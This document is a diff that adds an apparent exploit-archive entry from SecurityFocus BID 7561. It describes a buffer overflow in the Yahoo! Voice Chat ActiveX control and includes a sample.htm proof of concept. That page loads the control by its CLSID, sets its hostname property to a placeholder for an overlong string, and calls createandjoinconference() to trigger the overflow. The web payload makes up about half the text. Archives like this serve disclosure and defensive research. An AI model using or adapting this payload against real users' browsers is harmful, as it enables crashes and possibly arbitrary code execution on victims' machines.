@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/7561/info
+
+It has been reported that the ActiveX control used by the Yahoo! Voice Chat feature is prone to an exploitable buffer overflow vulnerability. This issue can be exploited via a malicious web page that calls the vulnerable control with malformed parameters. Although unconfirmed, it has been conjectured that this condition may be exploited to execute arbitrary code. 
+
+------sample.htm-----------
+<OBJECT id=yahooaudio type="application/x-oleobject"
+
+classid="clsid:2B323CD9-50E3-11D3-9466-00A0C9700498">
+</OBJECT>
+<script>
+yahooaudio.hostname="longstringheremorethan500chars";
+yahooaudio.createandjoinconference();
+</script>
+--------------------------- 
